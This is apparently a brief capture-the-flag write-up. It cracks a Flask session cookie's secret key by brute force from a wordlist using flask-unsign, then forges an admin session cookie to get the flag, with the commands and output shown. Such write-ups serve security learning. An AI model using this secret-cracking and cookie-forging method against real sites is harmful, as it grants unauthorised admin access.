Due to the title and the hints, it's obviously a flask cookie.
Let's use flask unsign to break this challenge.
See the server.py and the secret list is in it, store it to cookie.txt.
$ flask-unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y0yrhA.xn3m-OVWLLBo1YRSad0OZ48ilJQ" --unsign -w cookie.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
We get the secret is "fortune"
Then sign the cookie and send it back to the website to get the flag.
$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "fortune"
